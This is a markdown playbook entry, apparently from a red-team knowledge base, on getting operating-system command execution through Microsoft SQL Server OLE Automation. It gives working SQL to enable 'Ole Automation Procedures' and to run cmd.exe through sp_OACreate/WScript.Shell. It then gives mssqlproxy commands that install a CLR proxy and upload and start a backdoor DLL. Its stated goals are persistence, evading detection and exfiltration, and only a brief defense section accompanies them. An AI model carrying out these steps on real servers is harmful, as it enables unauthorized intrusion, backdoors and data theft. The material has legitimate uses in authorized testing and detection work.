---
id: b1477ba3-9d05-4380-b412-4eba2755fd4e
name: MSSQL-OLE-Automation-Command-Execution
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:20.482197+00:00'
updated_at: '2023-04-10T20:36:31.753387+00:00'
tactics:
  - '[[tactics/Defense-Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - >-
    [[techniques/System-Script-Proxy-Execution|T1216 - System Script Proxy
    Execution]]
sub_techniques: []
tags:
  - mssql
  - ole-automation
  - command-execution
  - dll-injection
commands:
  - '[[commands/whoami-check-current-user]]'
  - '[[commands/mssqlclient-install-proxy-dll]]'
  - '[[commands/mssqlclient-check-reciclador-dll]]'
  - '[[commands/mssqlclient-start-reciclador-dll]]'
  - '[[commands/sql-enable-ole-automation]]'
  - '[[commands/sql-upload-reciclador-dll]]'
platforms:
  - Windows
tools:
  - '[[tools/mssqlproxy]]'
validated: true
---

# MSSQL-OLE-Automation-Command-Execution

## Summary

This procedure enables and utilizes OLE Automation in Microsoft SQL Server to execute arbitrary operating system commands on the host system. It leverages built-in stored procedures like sp_OACreate and sp_OAMethod to instantiate objects such as WScript.Shell, allowing command execution for persistence, lateral movement, or data exfiltration. An alternative method uses the mssqlproxy tool to inject a custom DLL (reciclador.dll) for proxy-based execution, bypassing some restrictions.

## Description

OLE Automation in MSSQL allows the database engine to interact with COM objects, enabling the execution of OS commands through scripting hosts like WScript.Shell. This technique requires sysadmin privileges to configure and use. Once enabled, attackers can run commands hidden within SQL queries, evading direct shell access restrictions. The mssqlproxy variant installs a CLR proxy assembly and injects a DLL to facilitate file uploads and command execution via a backdoor mechanism. This is particularly effective in Windows environments with exposed MSSQL instances, mapping to execution via script proxies and defense evasion through legitimate SQL features.

## Requirements

1. Valid credentials with sysadmin privileges on the target MSSQL Server instance.
2. Network access to the MSSQL port (default TCP 1433).
3. Installed tools: mssqlclient.py from mssqlproxy for the DLL injection variant.
4. Target system: Windows Server with MSSQL installed and OLE Automation disabled by default.

## Defense

- Disable OLE Automation procedures using sp_configure 'Ole Automation Procedures', 0 if not required for business operations.
- Restrict sysadmin privileges to only necessary accounts and monitor privilege escalations.
- Enable SQL Server auditing for sp_OACreate, sp_OAMethod, and configuration changes; log CLR assembly loads.
- Use database firewalls to block suspicious SQL patterns and monitor for anomalous command executions via EDR tools.

## Objectives

1. Enable OLE Automation to allow COM object instantiation for command execution.
2. Execute arbitrary OS commands on the MSSQL host for reconnaissance, persistence, or lateral movement.
3. Inject custom DLLs via proxy for sustained access and evasion of direct SQL command logging.
4. Exfiltrate data or establish backdoors without triggering shell-based detections.

## Instructions

### Step 1: Verify Current User Context

**Context**: Confirm the current user privileges on the target system to ensure command execution capabilities before proceeding with OLE configuration. This step uses a simple OS command executed via an existing shell or initial access.

**Command** ([[commands/whoami-check-current-user]]):
```bash
whoami
```

> This command outputs the current Windows user account. Run it from an initial shell or via an existing SQL execution path to verify sysadmin-equivalent access. If the output shows a low-privilege user, escalate first.

**Expected Output**: A username like "nt authority\system" or the SQL service account, indicating sufficient privileges.

### Step 2: Enable OLE Automation Procedures

**Context**: OLE Automation must be explicitly enabled on the SQL instance, as it is disabled by default for security. This step configures advanced options and activates the feature using SQL commands.

**Command** ([[commands/sql-enable-ole-automation]]):
```sql
EXEC sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO
EXEC sp_configure 'Ole Automation Procedures', 1;
GO
RECONFIGURE;
GO
```

> These SQL statements enable advanced configuration visibility and then activate OLE Automation. Execute them in the SQL Server Management Studio (SSMS) or via a client like sqlcmd. The 'GO' separators batch the commands.

**Expected Output**: Messages like "Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install." No errors indicate success.

### Step 3: Execute Command via OLE Automation

**Context**: With OLE enabled, instantiate a WScript.Shell COM object to run OS commands. This allows hidden execution of cmd.exe or other binaries without direct shell access.

**Code** ([[codes/mssql-sql-enable-ole-and-execute-command]]):
```sql
DECLARE @execmd INT;
EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT;
EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c <your-command>';
```

> Replace '<your-command>' with the desired OS command (e.g., 'whoami > C:\temp\output.txt'). The SP_OACREATE creates the shell object, and SP_OAMETHOD invokes the 'run' method. This executes the command in a hidden window.

**Expected Output**: No direct output in SQL; success is confirmed by the command's side effects (e.g., file creation or process spawn). Errors like "0x80070005 Access denied" indicate privilege issues.

### Step 4: Install MSSQL Proxy for DLL Injection (Alternative Method)

**Context**: For scenarios requiring file upload and persistent injection, use mssqlproxy to install a CLR proxy assembly. This enables DLL uploads and execution via a custom backdoor.

**Command** ([[commands/mssqlclient-install-proxy-dll]]):
```bash
python3 mssqlclient.py '$_HOST/$_USERNAME:$_PASSWORD@$_TARGET_IP' -install -clr Microsoft.SqlServer.Proxy.dll
```

> This installs the proxy DLL on the target MSSQL instance. Substitute placeholders: $_HOST (e.g., localhost), $_USERNAME/$_PASSWORD (SQL creds), $_TARGET_IP (target address).

**Expected Output**: Confirmation like "CLR assembly installed successfully."

### Step 5: Check and Start Reciclador DLL

**Context**: After installation, verify and activate the custom reciclador.dll, which acts as a proxy for command execution and file operations.

**Command** ([[commands/mssqlclient-check-reciclador-dll]]):
```bash
python3 mssqlclient.py '$_HOST/$_USERNAME:$_PASSWORD@$_TARGET_IP' -check -reciclador '$_DLL_PATH'
```

> Checks if the DLL is loaded. $_DLL_PATH is typically 'C:\windows\temp\reciclador.dll'.

**Expected Output**: Status like "DLL loaded: True" or error if missing.

**Command** ([[commands/mssqlclient-start-reciclador-dll]]):
```bash
python3 mssqlclient.py '$_HOST/$_USERNAME:$_PASSWORD@$_TARGET_IP' -start -reciclador '$_DLL_PATH'
```

> Starts the DLL proxy for command routing.

**Expected Output**: "Proxy started successfully."

### Step 6: Upload Reciclador DLL

**Context**: Upload the actual DLL file to the target for injection, enabling the proxy functionality.

**Command** ([[commands/sql-upload-reciclador-dll]]):
```sql
upload reciclador.dll $_DLL_PATH
```

> Run in the mssqlclient.py interactive prompt (SQL>). $_DLL_PATH is the target location like 'C:\windows\temp\reciclador.dll'.

**Expected Output**: "File uploaded successfully."
